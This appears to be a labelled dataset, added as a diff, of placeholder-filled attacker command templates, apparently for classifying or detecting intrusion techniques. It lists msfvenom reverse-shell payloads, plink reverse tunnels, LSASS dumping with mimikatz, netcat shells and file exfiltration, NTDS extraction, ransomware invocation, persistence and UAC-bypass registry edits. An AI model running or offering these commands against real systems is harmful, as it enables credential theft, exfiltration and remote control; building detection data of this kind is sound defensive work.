@@ -1,0 +1,60 @@
+1	curl ${source_file_path} -o $ ${destination_file_path}
+1	cmd.exe /c "curl ${source_file_path} -o $ ${destination_file_path}"
+1	powershell -c "curl ${source_file_path} -o $ ${destination_file_path}"
+1	rsync -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+1	rsync -r ${username}@${ip_address}:${source_directory} ${destination_directory}
+1	scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+1	scp ${username}@${ip_address}:${source_file_path} ${destination_file_path}
+1	sftp ${username}@${ip_address}:${destination_file_path} <<< $"put ${source_file_path}"
+1	sftp  ${username}@${ip_address}:${source_file_path} ${destination_file_path}
+1	cmd /c "certutil -urlcache -split -f ${source_file_path} ${destination_file_path}"
+1	msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+1	echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+1	powershell -c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+1	powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+1	cmd.exe /c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+1	cmd.exe /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+1	plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+1	powershell -c "plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+1	cmd.exe /c "plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+1	wget https://${ip_address}/${destination_file_path}
+1	bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}
+1	cmd.exe /c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
+1	powershell -c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
+1	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsassdump.dmp full
+0	powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
+0	qwinsta.exe
+0	sekurlsa::minidump lsassdump.dmp
+0	lockbit.exe -pass ${password}
+0	sc create win32times binPath="${command_to_execute}"
+0	lockbit.exe -pass ${password}
+0	7z a archive.7z ${source_file_path}
+0	New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "${command_to_execute}"; New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+0	SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\${username} password=${password}
+0	msfvenom -p cmd/unix/reverse_bash HOST=${ip_address} LPORT=${port} -f raw -o reverse.sh
+0	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+0	.\VGAuthService.exe ${VGAuthService.dll_path},VoidFunc
+0	psexec.exe \\${ip_address} -s ${command_to_execute}
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v ${value_name} /t REG_DWORD /d ${value}
+0	cmd.exe /c "copy ${source_file_path} ${destination_file_path}"
+0	Start-Process -FilePath ${parent_path} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine "${command_to_execute}"
+0	schtasks /create /ru system /sc daily /tr "${command_to_execute}" /tn win32times /f
+0	powershell -c "${command_to_execute}" > ${local_file_path}
+0	cat ${source_file_path} | nc -vn ${ip_address} ${port}
+0	putty -ssh ${ip_address} -l ${username} -pw ${password} -m script.txt
+0	nc -c sh ${ip_address} ${port}
+0	cat ${source_file_path} | nc -vn ${ip_address} ${port}
+0	mstsc /v:${ip_address} /f
+0	Stop-Service -Name ${service_name}; Remove-Service -Name ${service_name}
+0	echo ${email_content} | sendmail ${username}@${domain}
+0	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+0	quser
+0	vssadmin create shadow /for=C:
+0	powershell -c "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
